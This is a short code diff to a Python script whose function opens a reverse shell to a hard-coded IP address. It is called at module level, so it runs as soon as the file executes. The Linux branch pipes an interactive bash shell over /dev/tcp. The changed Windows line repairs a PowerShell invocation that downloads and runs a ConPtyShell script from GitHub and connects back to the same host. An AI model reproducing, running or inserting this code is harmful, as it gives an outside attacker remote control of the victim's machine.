@@ -9,7 +9,7 @@ def runTheCommand():
 	if(system == "linux"): 
 		subprocess.check_call("/bin/bash -i > /dev/tcp/82.165.97.169/4858 0<&1 2>&1 &", shell=True, executable='/bin/bash')
 	elif(system == "windows" ):  
-		subprocess.check_call("IEX(IWR https://raw.githubusercontent.com/benax-rw/ConPtyShell/master/InvokeConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 87.76.65.54 4567", shell=True, executable="poweshell")
+		subprocess.check_call("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe IEX(IWR https://raw.githubusercontent.com/benax-rw/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 82.165.97.169 4858", shell=True)
 
 runTheCommand()
 
